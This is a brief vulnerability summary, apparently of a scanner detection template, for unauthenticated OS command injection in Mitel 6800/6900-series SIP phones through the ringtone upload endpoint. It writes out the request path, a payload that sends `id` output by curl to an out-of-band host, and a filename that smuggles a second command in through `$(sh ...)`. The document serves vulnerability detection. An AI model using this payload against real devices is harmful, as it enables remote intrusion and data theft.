## Vulnerability
OS Command Injection in Mitel 6000 series SIP phones (6800 Series, 6900 Series, 6900w Series through 6.4 SP4 R6.4.0.4006, and 6970 Conference Unit through 6.4 SP4 R6.4.0.4006 or V1 R0.1.0) due to insufficient parameter sanitization in the ringtone upload feature. Allows unauthenticated remote attackers to execute arbitrary commands via the web configuration endpoint on port 49249/tcp.

## PoC / Detection
Classification: rce

The template detects the vulnerability with two sequential raw POST requests to `/cgi-bin/webconfig?page=upload_ringtone`. The first uploads a multipart form containing a crafted file with embedded payload `curl -d $(id) {{interactsh-url}}`. The second triggers execution using command substitution in the filename: `fake$(sh ${HOME}userdata${HOME}ringtone${HOME}{{random_number}}.txt).wav`. Success is determined by an OOB DNS callback to interactsh and the string "ringtone.html" in the second response body.
